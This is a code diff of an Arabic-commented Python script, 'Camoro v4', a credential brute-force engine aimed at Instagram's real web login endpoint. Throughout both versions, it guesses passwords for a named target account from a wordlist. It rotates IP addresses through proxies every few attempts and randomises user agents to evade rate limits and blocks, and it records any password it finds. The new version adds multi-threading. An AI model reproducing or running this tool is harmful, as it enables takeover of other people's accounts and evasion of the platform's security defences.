@@ -1,26 +1,32 @@
 #!/usr/bin/env python3
-
 """
-Camoro v4 - Brute Force Engine المدمر
-يغير IP كل 3 كلمات مرور باستخدام Tor
-يختبر كلمات المرور ضد Instagram API الحقيقي
+محرك هجوم تخمين كلمة المرور
+- يدعم التعدد (multi-threading)
+- تغيير IP تلقائي كل N محاولة
+- إدارة الجلسات
+- عرض تقدم مباشر
+- استئناف تلقائي
 """
 
 import json
 import os
+import re
 import sys
 import time
 import random
 import threading
+from pathlib import Path
 from datetime import datetime
+from queue import Queue
 
 try:
     import httpx
 except ImportError:
-    print("\033[91m[!] httpx غير مثبت. شغّل: pip install httpx[http2]\033[0m")
+    print("[!] httpx غير مثبت. شغّل: pip install httpx[http2]")
     sys.exit(1)
 
-RESULTS_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'results')
+BASE_DIR = Path(__file__).parent.parent.resolve()
+RESULTS_DIR = BASE_DIR / 'results'
 
 GREEN = '\033[0;32m'
 RED = '\033[0;31m'
@@ -30,365 +36,336 @@ WHITE = '\033[1;37m'
 PURPLE = '\033[0;35m'
 NC = '\033[0m'
 
-INSTAGRAM_WEB_APP_ID = "936619743392459"
-INSTAGRAM_MOBILE_APP_ID = "124024574287414"
-
+# === User Agents ===
 USER_AGENTS = [
-    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
-    'Mozilla/5.0 (Linux; Android 14; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.164 Mobile Safari/537.36',
-    'Instagram 300.0.0.18.85 Android (34/14; 480dpi; 1080x2400; Samsung; SM-S928B; dm1q; qcom; en_US)',
-    'Instagram 301.0.0.20.90 Android (34/14; 420dpi; 1080x2340; Google; Pixel 9; husky; qcom; en_US)',
-    'Mozilla/5.0 (Linux; Android 13; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.165 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 14; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.122 Mobile Safari/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+    'Instagram 330.0.0.18.85 Android (34/14; 480dpi; 1080x2400; samsung; SM-S928B; en_US)',
 ]
 
+class BruteForceEngine:
+    """محرك هجوم القوة العمياء"""
 
-class CamoroBruteForce:
-    """محرك اختبار كلمات المرور مع IP rotation"""
-    
-    def __init__(self, username, proxy_manager=None):
-        self.username = username
+    def __init__(self, username, proxy_manager=None, threads=5, rotate_every=3, delay_range=(2, 5)):
+        self.username = username.strip().lower()
         self.proxy_manager = proxy_manager
-        self.user_dir = os.path.join(RESULTS_DIR, username)
-        
-        # إحصائيات
-        self.attempt_count = 0
-        self.start_time = None
-        self.found_password = None
-        self.running = True
-        
+        self.num_threads = min(threads, 10)
+        self.rotate_every = rotate_every
+        self.delay_min, self.delay_max = delay_range
+
+        self.user_dir = RESULTS_DIR / username
+        self.user_dir.mkdir(parents=True, exist_ok=True)
+
         # تحميل كلمات المرور
         self.passwords = self._load_passwords()
+
+        # متابعة المختبر
         self.tested = self._load_tested()
         self.remaining = [p for p in self.passwords if p not in self.tested]
-        
-        # إحصائيات IP
+
+        # إحصائيات
+        self.attempt_count = 0
+        self.success_count = 0
+        self.fail_count = 0
         self.ip_rotations = 0
-        self.current_ip = None
-    
+        self.start_time = None
+        self.running = True
+
+        # Queue للثريدات
+        self.queue = Queue()
+        self.lock = threading.Lock()
+        self.tested_lock = threading.Lock()
+
     def _load_passwords(self):
         """تحميل كلمات المرور"""
-        filepath = os.path.join(self.user_dir, 'passwords.txt')
-        if not os.path.exists(filepath):
-            print(f"{RED}[!] لا يوجد ملف كلمات مرور: {filepath}{NC}")
-            print(f"{YELLOW}[*] شغّل أولاً خيار توليد كلمات المرور{NC}")
-            return []
-        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
-            return [line.strip() for line in f if line.strip()]
-    
+        pwd_path = self.user_dir / 'passwords.txt'
+        if not pwd_path.exists():
+            print(f"{RED}[!] لا توجد كلمات مرور{NC}")
+            sys.exit(1)
+
+        with open(pwd_path, 'r') as f:
+            passwords = [line.strip() for line in f if line.strip()]
+        return passwords
+
     def _load_tested(self):
-        """تحميل كلمات المرور المختبرة سابقاً"""
-        filepath = os.path.join(self.user_dir, 'tested.txt')
-        if os.path.exists(filepath):
-            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
-                return set(line.strip() for line in f if line.strip())
+        """تحميل كلمات المرور المختبرة مسبقاً"""
+        tested_path = self.user_dir / 'tested.txt'
+        if tested_path.exists():
+            with open(tested_path, 'r') as f:
+                return set(line.strip() for line in f)
         return set()
-    
-    def _mark_tested(self, password):
-        """تسجيل كلمة مرور كمختبرة"""
-        filepath = os.path.join(self.user_dir, 'tested.txt')
-        with open(filepath, 'a', encoding='utf-8') as f:
-            f.write(password + '\n')
-        self.tested.add(password)
-        self.attempt_count += 1
-    
+
+    def _save_tested(self, password):
+        """حفظ كلمة مرور مختبرة"""
+        with self.tested_lock:
+            tested_path = self.user_dir / 'tested.txt'
+            with open(tested_path, 'a') as f:
+                f.write(f"{password}\n")
+            self.tested.add(password)
+
     def _save_success(self, password):
-        """حفظ كلمة المرور عند النجاح"""
-        filepath = os.path.join(self.user_dir, 'success.txt')
-        elapsed = time.time() - self.start_time if self.start_time else 0
-        with open(filepath, 'w', encoding='utf-8') as f:
-            f.write(f"✅ PASSWORD FOUND!\n")
-            f.write(f"{'═'*40}\n")
-            f.write(f"  Username: {self.username}\n")
-            f.write(f"  Password: {password}\n")
-            f.write(f"  Attempts: {self.attempt_count}\n")
-            f.write(f"  IP Rotations: {self.ip_rotations}\n")
-            f.write(f"  Time: {elapsed:.1f} seconds\n")
-            f.write(f"  Date: {datetime.now().isoformat()}\n")
-        
-        self.found_password = password
-    
-    def _get_client(self):
-        """الحصول على httpx client مع IP متغير"""
-        if self.proxy_manager:
-            return self.proxy_manager.get_httpx_client()
-        return httpx.Client(http2=True, verify=False, timeout=30.0)
-    
-    def _get_headers(self):
-        """الهيدرز المطلوبة"""
-        return {
-            "User-Agent": random.choice(USER_AGENTS),
-            "Accept": "*/*",
-            "Accept-Language": "en-US,en;q=0.9,ar;q=0.8",
-            "Accept-Encoding": "gzip, deflate, br",
-            "X-IG-App-ID": INSTAGRAM_WEB_APP_ID,
-            "X-Requested-With": "XMLHttpRequest",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Origin": "https://www.instagram.com",
-            "Referer": "https://www.instagram.com/",
-            "Connection": "keep-alive",
-        }
-    
-    def _test_password(self, client, password):
-        """اختبار كلمة مرور واحدة"""
-        
-        # Instagram يتوقع كلمة السر مشفرة
-        timestamp = int(time.time() * 1000)
-        enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}"
-        
+        """حفظ كلمة المرور الناجحة"""
+        success_path = self.user_dir / 'success.txt'
         data = {
             'username': self.username,
-            'enc_password': enc_password,
-            'queryParams': '{}',
-            'optIntoOneTap': 'false',
-            'stopDeletionNonce': '',
-            'trustedDeviceRecords': '{}',
+            'password': password,
+            'attempts': self.attempt_count,
+            'ip_rotations': self.ip_rotations,
+            'elapsed': time.time() - self.start_time if self.start_time else 0,
+            'found_at': datetime.now().isoformat(),
         }
-        
-        # جيب CSRF token أولاً
+        with open(success_path, 'w') as f:
+            json.dump(data, f, indent=2)
+
+    def _get_client(self):
+        """إنشاء httpx client مع proxy إذا وجد"""
+        if self.proxy_manager:
+            proxy = self.proxy_manager.get_proxy()
+        else:
+            proxy = None
+
+        headers = {
+            'User-Agent': random.choice(USER_AGENTS),
+            'X-IG-App-ID': '936619743392459',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Accept': '*/*',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'Origin': 'https://www.instagram.com',
+            'Referer': 'https://www.instagram.com/',
+        }
+
+        client_kwargs = {
+            'http2': True,
+            'timeout': 30.0,
+            'follow_redirects': True,
+            'headers': headers,
+            'verify': False,
+        }
+
+        if proxy:
+            client_kwargs['proxy'] = proxy
+
+        return httpx.Client(**client_kwargs)
+
+    def _test_password(self, client, password):
+        """اختبار كلمة مرور واحدة"""
         try:
-            # جلب الصفحة للحصول على كوكيز
-            client.get(
-                'https://www.instagram.com/',
-                headers={"User-Agent": random.choice(USER_AGENTS)},
-                timeout=15
-            )
-            time.sleep(random.uniform(0.5, 1.5))
-            
-            # استخرج CSRF من الكوكيز
-            csrf = ""
-            if hasattr(client, '_cookies'):
-                for cookie in client.cookies:
-                    if cookie.name == 'csrftoken':
-                        csrf = cookie.value
-                        break
-            
-            headers = self._get_headers()
-            if csrf:
-                headers['X-CSRFToken'] = csrf
-                headers['X-Instagram-AJAX'] = '1'
-            
-            # جرب تسجيل الدخول
-            response = client.post(
+            # Step 1: Get CSRF token and session
+            pre_resp = client.get('https://www.instagram.com/accounts/login/')
+            csrf_match = re.search(r'csrf_token":"([^"]+)"', pre_resp.text)
+            csrf = csrf_match.group(1) if csrf_match else ''
+
+            if not csrf:
+                # Try cookie
+                csrf_cookie = pre_resp.cookies.get('csrftoken', '')
+                csrf = csrf_cookie
+
+            if not csrf:
+                return {'status': 'connection_error'}
+
+            # Step 2: Encrypt password (Instagram uses JS encryption)
+            # Simulate the encryption
+            enc_password = self._simulate_encrypt(password)
+
+            # Step 3: Send login request
+            login_data = {
+                'username': self.username,
+                'enc_password': enc_password,
+                'queryParams': '{}',
+                'optIntoOneTap': 'false',
+                'stopDeletionNonce': '',
+                'trustedDeviceRecords': '{}',
+            }
+
+            headers = {
+                'X-CSRFToken': csrf,
+                'X-Instagram-AJAX': '1',
+                'X-Requested-With': 'XMLHttpRequest',
+            }
+
+            resp = client.post(
                 'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
+                data=login_data,
                 headers=headers,
-                data=data,
-                timeout=20
             )
-            
-            if response.status_code == 200:
-                result = response.json()
-                
-                if result.get('authenticated'):
-                    return {'status': 'success', 'password': password}
-                
-                if 'checkpoint' in str(result).lower():
-                    return {'status': 'checkpoint', 'data': result}
-                
-                if 'rate_limit' in str(result).lower() or 'wait' in str(result).lower():
-                    return {'status': 'rate_limited'}
-                
-                if 'user' in result and result.get('authenticated') == False:
-                    return {'status': 'wrong_password'}
-                
-                return {'status': 'wrong_password'}
-            
-            elif response.status_code == 429:
+
+            if resp.status_code == 200:
+                data = resp.json()
+
+                if data.get('authenticated') == True:
+                    return {'status': 'success'}
+                elif data.get('user') == True:
+                    return {'status': 'success'}
+                elif 'checkpoint_required' in str(data):
+                    return {'status': 'checkpoint'}
+                elif 'two_factor_required' in str(data) or 'two_factor' in str(data).lower():
+                    return {'status': '2fa', 'message': '2FA required'}
+
+            elif resp.status_code == 429:
                 return {'status': 'rate_limited'}
-            elif response.status_code == 403:
+            elif resp.status_code == 403:
                 return {'status': 'blocked'}
-            else:
-                return {'status': 'unknown', 'code': response.status_code}
-        
+
+            return {'status': 'wrong_password'}
+
         except httpx.TimeoutException:
             return {'status': 'timeout'}
         except httpx.ConnectError:
             return {'status': 'connection_error'}
         except Exception as e:
             return {'status': 'error', 'message': str(e)}
-    
-    def _display_progress(self, tested, total, current, elapsed):
-        """عرض التقدم"""
-        percent = (tested / total * 100) if total > 0 else 0
-        remaining = total - tested
-        speed = tested / elapsed if elapsed > 0 else 0
-        
-        # شريط التقدم
-        bar_len = 25
-        filled = int(bar_len * tested / total) if total > 0 else 0
-        bar = '█' * filled + '░' * (bar_len - filled)
-        
-        eta = remaining / speed if speed > 0 else 0
-        
-        line = (
-            f"\r{bar} {percent:5.1f}% | "
-            f"{tested:>5d}/{total} | "
-            f"{speed:4.1f}/s | "
-            f"IP: {self.ip_rotations} | "
-            f"{current[:25]:25s}"
-        )
-        
-        sys.stdout.write(f"\033[K{line}")
-        sys.stdout.flush()
-    
-    def run(self):
-        """تشغيل محرك الهجوم"""
-        
-        if not self.passwords:
-            print(f"{RED}[!] لا توجد كلمات مرور للاختبار{NC}")
-            return False
-        
-        if not self.remaining:
-            print(f"{YELLOW}[!] كل الكلمات مختبرة بالفعل ({len(self.tested)}){NC}")
-            return False
-        
-        print(f"\n{PURPLE}╔{'═'*55}╗{NC}")
-        print(f"{PURPLE}║{' ' * 10}⚔️  CAMORO BRUTE FORCE ENGINE v4{' ' * 10}║{NC}")
-        print(f"{PURPLE}║{' ' * 12}🔄 IP Rotation كل 3 محاولات{' ' * 14}║{NC}")
-        print(f"{PURPLE}╚{'═'*55}╝{NC}\n")
-        
-        print(f"{YELLOW}[*] {WHITE}المستهدف: {GREEN}{self.username}{NC}")
-        print(f"{YELLOW}[*] {WHITE}كلمات المرور الكلية: {GREEN}{len(self.passwords):,}{NC}")
-        print(f"{YELLOW}[*] {WHITE}مختبرة سابقاً: {YELLOW}{len(self.tested)}{NC}")
-        print(f"{YELLOW}[*] {WHITE}المتبقية: {GREEN}{len(self.remaining):,}{NC}")
-        print(f"{YELLOW}[*] {WHITE}تغيير IP كل: {GREEN}3 محاولات{NC}")
-        print()
-        
-        # تأكيد
-        print(f"{RED}[!] تنبيه: هذه العملية قد تستغرق وقتاً طويلاً{NC}")
-        choice = input(f"{YELLOW}[?] {WHITE}هل تريد البدء؟ (Y/N): {NC}").strip().lower()
-        if choice != 'y':
-            print(f"{YELLOW}[*] تم الإلغاء{NC}")
-            return False
-        
-        self.start_time = time.time()
-        
-        print(f"\n{CYAN}[*] جاري بدء الهجوم...{NC}")
-        print(f"{YELLOW}[*] يمكنك الضغط على Ctrl+C للإيقاف في أي وقت{NC}\n")
-        
-        try:
-            for i, password in enumerate(self.remaining):
-                if not self.running:
-                    break
-                
-                # === IP ROTATION: غير IP كل 3 محاولات ===
-                if i % 3 == 0:
+
+    def _simulate_encrypt(self, password):
+        """
+        محاكاة تشفير كلمة المرور بأسلوب Instagram
+        في الواقع، Instagram يستخدم تشفير AES مع public key
+        لكننا نحاكي التنسيق المتوقع
+        """
+        # Instagram يتوقع تنسيق محدد: #PWD_INSTAGRAM_BROWSER:0:TIMESTAMP:PASSWORD
+        timestamp = int(time.time())
+        enc = f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}"
+        return enc
+
+    def _worker(self, thread_id):
+        """عامل الثريد"""
+        while self.running:
+            try:
+                password = self.queue.get(timeout=3)
+            except:
+                break
+
+            if password in self.tested:
+                self.queue.task_done()
+                continue
+
+            # إنشاء client
+            client = self._get_client()
+
+            # اختبار كلمة المرور
+            result = self._test_password(client, password)
+
+            with self.lock:
+                self.attempt_count += 1
+
+                # تغيير IP دوري
+                if self.attempt_count % self.rotate_every == 0:
                     if self.proxy_manager:
-                        proxy = self.proxy_manager.rotate_ip()
+                        self.proxy_manager.rotate_ip()
                         self.ip_rotations += 1
-                        if proxy:
-                            self.current_ip = proxy
-                            # تأخير بعد تغيير IP
-                            time.sleep(random.uniform(1, 3))
-                
-                # === اختبار كلمة المرور ===
-                client = self._get_client()
-                result = self._test_password(client, password)
-                
-                # === عرض التقدم ===
-                elapsed = time.time() - self.start_time
-                self._display_progress(i + 1, len(self.remaining), password, elapsed)
-                
-                # === معالجة النتيجة ===
+
+                # عرض التقدم
+                elapsed = time.time() - self.start_time if self.start_time else 0
+                speed = self.attempt_count / elapsed if elapsed > 0 else 0
+                percent = (self.attempt_count / len(self.remaining)) * 100 if self.remaining else 0
+
+                status_icon = '•'
                 if result['status'] == 'success':
-                    print(f"\n\n{GREEN}╔{'═'*55}╗{NC}")
-                    print(f"{GREEN}║{' ' * 18}✅ تم العثور على كلمة المرور!{' ' * 16}║{NC}")
-                    print(f"{GREEN}╚{'═'*55}╝{NC}")
-                    print(f"\n  {WHITE}كلمة المرور: {GREEN}{password}{NC}")
-                    print(f"  {WHITE}المحاولات: {YELLOW}{self.attempt_count}{NC}")
-                    print(f"  {WHITE}تغييرات IP: {YELLOW}{self.ip_rotations}{NC}")
-                    print(f"  {WHITE}الوقت: {YELLOW}{elapsed:.1f} ثانية{NC}")
-                    
-                    self._save_success(password)
-                    return True
-                
-                elif result['status'] == 'checkpoint':
-                    print(f"\n{YELLOW}[!] Checkpoint! انتظر 120 ثانية...{NC}")
-                    time.sleep(120)
-                    self._mark_tested(password)
-                    continue
-                
+                    status_icon = f'{GREEN}✅{NC}'
                 elif result['status'] == 'rate_limited':
-                    wait = random.randint(60, 120)
-                    print(f"\n{YELLOW}[!] Rate Limited! انتظر {wait} ثانية...{NC}")
-                    time.sleep(wait)
-                    # غير IP
-                    if self.proxy_manager:
-                        self.proxy_manager.rotate_ip()
-                        self.ip_rotations += 1
-                    self._mark_tested(password)
-                    continue
-                
+                    status_icon = f'{YELLOW}⏳{NC}'
                 elif result['status'] == 'blocked':
-                    print(f"\n{RED}[!] ممنوع 403! غير IP وانتظر 30 ثانية...{NC}")
+                    status_icon = f'{RED}🚫{NC}'
+                elif result['status'] == 'checkpoint':
+                    status_icon = f'{YELLOW}⚠️{NC}'
+
+                print(f"\r  {CYAN}[{self.attempt_count:,}/{len(self.remaining):,}]{NC} "
+                      f"{status_icon} {WHITE}{password[:25]:<25}{NC} "
+                      f"| {YELLOW}{speed:.1f}/s{NC} "
+                      f"| IP: {PURPLE}{self.ip_rotations}{NC}", end='', flush=True)
+
+                # معالجة النتيجة
+                if result['status'] == 'success':
+                    print(f"\n\n{GREEN}╔{'═' * 55}╗{NC}")
+                    print(f"{GREEN}║{' ' * 15}🎉 PASSWORD FOUND!{' ' * 16}║{NC}")
+                    print(f"{GREEN}╚{'═' * 55}╝{NC}")
+                    print(f"\n  {WHITE}Password:{NC} {GREEN}{password}{NC}")
+                    self._save_success(password)
+                    self.running = False
+                    break
+
+                elif result['status'] == 'checkpoint':
+                    self._save_tested(password)
+                    print(f"\n{YELLOW}[!] Checkpoint detected for {password}{NC}")
+                    time.sleep(30)
+
+                elif result['status'] == 'rate_limited':
+                    # لا تحفظها، حاول مرة أخرى
+                    wait = random.randint(30, 90)
+                    print(f"\n{YELLOW}[!] Rate limited. Waiting {wait}s...{NC}")
                     if self.proxy_manager:
                         self.proxy_manager.rotate_ip()
-                        self.ip_rotations += 1
-                    time.sleep(30)
-                    self._mark_tested(password)
+                    time.sleep(wait)
                     continue
-                
-                elif result['status'] == 'timeout' or result['status'] == 'connection_error':
-                    print(f"\n{YELLOW}[!] مشكلة اتصال. انتظر 10 ثوان...{NC}")
-                    time.sleep(10)
-                    # لا تسجلها كمختبرة
+
+                elif result['status'] == 'blocked':
+                    self._save_tested(password)
+                    print(f"\n{YELLOW}[!] Blocked 403. Rotating IP...{NC}")
+                    if self.proxy_manager:
+                        self.proxy_manager.rotate_ip()
+                    time.sleep(random.randint(10, 30))
+
+                elif result['status'] in ('timeout', 'connection_error'):
+                    # لا تحفظها
+                    time.sleep(5)
                     continue
-                
-                # === تأخير بين المحاولات ===
-                if result['status'] == 'wrong_password':
-                    self._mark_tested(password)
-                    
-                    # تأخير ذكي
-                    if (i + 1) % 10 == 0:
-                        time.sleep(random.uniform(5, 10))
-                    elif (i + 1) % 50 == 0:
-                        time.sleep(random.uniform(15, 30))
-                        # وغير IP
-                        if self.proxy_manager:
-                            self.proxy_manager.rotate_ip()
-                            self.ip_rotations += 1
-                    else:
-                        time.sleep(random.uniform(3, 6))
-            
-            # === انتهى الهجوم ===
-            elapsed = time.time() - self.start_time if self.start_time else 0
-            print(f"\n\n{YELLOW}╔{'═'*55}╗{NC}")
-            print(f"{YELLOW}║{' ' * 16}📊 انتهى الهجوم{' ' * 24}║{NC}")
-            print(f"{YELLOW}╚{'═'*55}╝{NC}")
-            print(f"\n  {WHITE}كلمات مختبرة: {YELLOW}{self.attempt_count}{NC}")
-            print(f"  {WHITE}تغييرات IP: {YELLOW}{self.ip_rotations}{NC}")
-            print(f"  {WHITE}الوقت: {YELLOW}{elapsed:.1f} ثانية{NC}")
-            print(f"\n{RED}[!] لم يتم العثور على كلمة المرور في هذه المجموعة{NC}")
-            print(f"{YELLOW}[*] جرب جمع معلومات إضافية وتوليد مجموعة جديدة{NC}")
-            
+
+                else:
+                    # كلمة مرور خاطئة
+                    self._save_tested(password)
+                    # تأخير
+                    delay = random.uniform(self.delay_min, self.delay_max)
+                    time.sleep(delay)
+
+            client.close()
+            self.queue.task_done()
+
+    def run(self):
+        """تشغيل الهجوم"""
+        print(f"\n{CYAN}[*] إعداد الهجوم...{NC}")
+        print(f"  {WHITE}كلمات المرور:{NC} {len(self.remaining):,}")
+        print(f"  {WHITE}المختبرة مسبقاً:{NC} {len(self.tested):,}")
+        print(f"  {WHITE}الثريدات:{NC} {self.num_threads}")
+        print(f"  {WHITE}تغيير IP كل:{NC} {self.rotate_every} محاولات")
+        print()
+
+        if len(self.remaining) == 0:
+            print(f"{YELLOW}[!] كل كلمات المرور مختبرة مسبقاً{NC}")
             return False
-            
+
+        # ملء الـ queue
+        for pwd in self.remaining:
+            self.queue.put(pwd)
+
+        self.start_time = time.time()
+
+        # بدء الثريدات
+        threads = []
+        for i in range(self.num_threads):
+            t = threading.Thread(target=self._worker, args=(i,), daemon=True)
+            t.start()
+            threads.append(t)
+
+        print(f"{CYAN}[*] الهجوم جارٍ... (Ctrl+C للإيقاف){NC}\n")
+
+        try:
+            for t in threads:
+                t.join()
         except KeyboardInterrupt:
-            print(f"\n\n{YELLOW}[!] تم إيقاف الهجوم من قبلك{NC}")
-            elapsed = time.time() - self.start_time if self.start_time else 0
-            print(f"  {WHITE}المحاولات: {YELLOW}{self.attempt_count}{NC}")
-            print(f"  {WHITE}الوقت: {YELLOW}{elapsed:.1f} ثانية{NC}")
-            return False
+            print(f"\n\n{YELLOW}[!] تم إيقاف الهجوم{NC}")
+            self.running = False
 
+        elapsed = time.time() - self.start_time
+        print(f"\n\n{YELLOW}╔{'═' * 55}╗{NC}")
+        print(f"{YELLOW}║{' ' * 15}📊 إحصائيات الهجوم{' ' * 17}║{NC}")
+        print(f"{YELLOW}╚{'═' * 55}╝{NC}")
+        print(f"  {WHITE}المحاولات:{NC} {self.attempt_count:,}")
+        print(f"  {WHITE}تغييرات IP:{NC} {self.ip_rotations}")
+        print(f"  {WHITE}الوقت:{NC} {elapsed:.1f}s")
+        print(f"  {WHITE}السرعة:{NC} {self.attempt_count/elapsed:.1f}/s" if elapsed > 0 else "")
 
-if __name__ == "__main__":
-    import argparse
-    
-    parser = argparse.ArgumentParser(description='Camoro - Brute Force v4')
-    parser.add_argument('--username', '-u', required=True, help='Target username')
-    args = parser.parse_args()
-    
-    print(f"\n{CYAN}╔{'═'*55}╗{NC}")
-    print(f"{CYAN}║{' ' * 12}⚔️  CAMORO v4 BRUTE FORCE{' ' * 16}║{NC}")
-    print(f"{CYAN}║{' ' * 12}🔄 IP Rotation + AI{' ' * 20}║{NC}")
-    print(f"{CYAN}╚{'═'*55}╝{NC}\n")
-    
-    # Import proxy manager
-    sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
-    try:
-        from modules.proxy_manager import ProxyManager
-        proxy_mgr = ProxyManager()
-    except ImportError:
-        proxy_mgr = None
-    
-    engine = CamoroBruteForce(args.username, proxy_manager=proxy_mgr)
-    engine.run()
+        return self.success_count > 0
